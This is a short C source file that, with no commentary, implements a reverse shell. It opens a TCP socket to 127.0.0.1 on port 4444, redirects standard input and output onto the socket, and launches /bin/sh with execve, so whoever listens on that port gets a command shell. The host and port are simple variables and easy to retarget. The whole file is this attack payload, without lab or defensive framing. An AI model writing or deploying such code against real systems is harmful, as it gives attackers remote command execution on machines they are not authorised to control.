#include <fcntl.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>

int main() {
	int port = 4444;
	char* ip = "127.0.0.1";

	int sockfd, sockfd2;
	struct sockaddr_in serv_addr;

	serv_addr.sin_family = AF_INET;
	serv_addr.sin_port = htons(port);
	inet_aton(ip, &serv_addr.sin_addr.s_addr);


	sockfd = socket(AF_INET, SOCK_STREAM, 0);
	sockfd2 = dup(sockfd);
	connect(sockfd2, (struct sockaddr *)&serv_addr, sizeof(serv_addr));
	close(sockfd2);
	
	close(0);
	dup(sockfd);
	close(sockfd);
	close(1);
	dup(0);

	execve("/bin/sh", NULL, NULL);

	return 0;
}